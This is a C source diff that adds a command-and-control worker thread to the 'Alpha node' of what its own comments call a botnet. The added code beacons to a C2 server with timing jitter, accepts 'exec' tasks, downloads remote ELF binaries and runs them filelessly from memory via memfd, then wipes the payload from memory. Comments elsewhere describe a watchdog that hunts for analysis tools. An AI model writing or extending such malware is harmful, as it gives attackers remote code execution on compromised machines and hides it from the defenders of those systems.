@@ -14,6 +14,7 @@
  *    Thread 1: IPC Server        — accepts Beta connections, dispatches cmds
  *    Thread 2: Watchdog           — scans for hostile analysis processes
  *    Thread 3: Heartbeat Monitor  — tracks Beta node liveness
+ *    Thread 4: C2 Worker          — communicates with C2 server (Beacon/Tasking)
  *
  *  The Alpha node communicates with the C2 server (via the Ghost Loader)
  *  and distributes tasks/payloads to Beta nodes.
@@ -21,9 +22,11 @@
  */
 
 #include "../c2_comms/crypto.h"
+#include "../c2_comms/c2_client.h"
 #include "../common/config.h"
 #include "../common/logging.h"
 #include "../common/types.h"
+#include "../common/loader.h"
 #include "ipc_protocol.h"
 
 
@@ -58,6 +61,7 @@ static pthread_mutex_t g_beta_mutex = PTHREAD_MUTEX_INITIALIZER;
 static pthread_t g_server_thread;
 static pthread_t g_watchdog_thread;
 static pthread_t g_heartbeat_thread;
+static pthread_t g_c2_thread;
 static volatile bool g_alpha_running = false;
 
 /* ── Internal: IPC Socket Helpers ────────────────────────────────────────── */
@@ -548,6 +552,89 @@ static void *heartbeat_monitor_thread(void *arg) {
   return NULL;
 }
 
+/* ── Thread: C2 Worker (Botnet) ──────────────────────────────────────────── */
+
+static void *c2_worker_thread(void *arg) {
+  (void)arg;
+
+  aegis_log_event(g_alpha_log, LOG_CAT_ALPHA, LOG_SEV_INFO,
+                  "C2 worker thread started");
+
+  /* Initialize C2 client */
+  aegis_c2_ctx_t c2;
+  aegis_result_t rc = aegis_c2_init(&c2, g_alpha_crypto);
+  if (rc != AEGIS_OK) {
+    aegis_log_event(g_alpha_log, LOG_CAT_ALPHA, LOG_SEV_ERROR,
+                    "C2 init failed (rc=%d)", rc);
+    return NULL;
+  }
+
+  while (g_alpha_running) {
+    /* Beacon to C2 and check for tasks */
+    uint8_t task_buf[4096];
+    size_t task_len = 0;
+
+    rc = aegis_c2_beacon(&c2, task_buf, sizeof(task_buf), &task_len);
+    if (rc == AEGIS_OK && task_len > 0) {
+      /* Process tasking */
+      char *task_str = (char *)malloc(task_len + 1);
+      if (task_str) {
+        memcpy(task_str, task_buf, task_len);
+        task_str[task_len] = '\0';
+
+        aegis_log_event(g_alpha_log, LOG_CAT_ALPHA, LOG_SEV_INFO,
+                        "Received task: %s", task_str);
+
+        /* Simple task parsing (format: "CMD ARG") */
+        /* Currently we support: "exec <resource_id>" */
+
+        if (strncmp(task_str, "exec ", 5) == 0) {
+          const char *res_id = task_str + 5;
+          aegis_log_event(g_alpha_log, LOG_CAT_ALPHA, LOG_SEV_INFO,
+                          "Executing remote resource: %s", res_id);
+
+          uint8_t *elf_bin = NULL;
+          size_t elf_len = 0;
+
+          rc = aegis_c2_fetch_resource(&c2, res_id, &elf_bin, &elf_len);
+          if (rc == AEGIS_OK && elf_bin && elf_len > 0) {
+            aegis_log_event(g_alpha_log, LOG_CAT_ALPHA, LOG_SEV_INFO,
+                            "Resource fetched (%zu bytes), executing...", elf_len);
+
+            /* Execute filelessly via memfd */
+            /* Note: this forks, so Alpha stays alive. The child process runs the ELF. */
+            rc = aegis_exec_from_memory(elf_bin, elf_len, res_id, NULL, NULL);
+            if (rc != AEGIS_OK) {
+               aegis_log_event(g_alpha_log, LOG_CAT_ALPHA, LOG_SEV_ERROR,
+                               "Execution failed (rc=%d)", rc);
+            }
+
+            /* Secure wipe */
+            AEGIS_WIPE(elf_bin, elf_len, 3);
+            free(elf_bin);
+          } else {
+            aegis_log_event(g_alpha_log, LOG_CAT_ALPHA, LOG_SEV_ERROR,
+                            "Failed to fetch resource (rc=%d)", rc);
+          }
+        }
+
+        free(task_str);
+      }
+    }
+
+    /* Wait for next beacon interval (with jitter) */
+    uint32_t interval = aegis_c2_calculate_jitter(&c2);
+    struct timespec ts = {
+        .tv_sec = interval / 1000,
+        .tv_nsec = (interval % 1000) * 1000000L
+    };
+    nanosleep(&ts, NULL);
+  }
+
+  aegis_c2_destroy(&c2);
+  return NULL;
+}
+
 /* ── Public: Command Dispatch to Beta Nodes ──────────────────────────────── */
 
 /*
@@ -618,14 +705,18 @@ aegis_result_t alpha_node_start(aegis_log_ctx_t *log,
   pthread_create(&g_watchdog_thread, NULL, watchdog_thread, NULL);
   pthread_create(&g_heartbeat_thread, NULL, heartbeat_monitor_thread, NULL);
 
+  /* Start C2 worker thread (Botnet capability) */
+  pthread_create(&g_c2_thread, NULL, c2_worker_thread, NULL);
+
   /* Detach threads so they clean up on their own */
   pthread_detach(g_server_thread);
   pthread_detach(g_watchdog_thread);
   pthread_detach(g_heartbeat_thread);
+  pthread_detach(g_c2_thread);
 
   aegis_log_event(g_alpha_log, LOG_CAT_ALPHA, LOG_SEV_INFO,
                   "Alpha Node operational: IPC=%s, Watchdog=active, "
-                  "Heartbeat=active",
+                  "Heartbeat=active, C2=active",
                   g_sock_path);
 
   return AEGIS_OK;
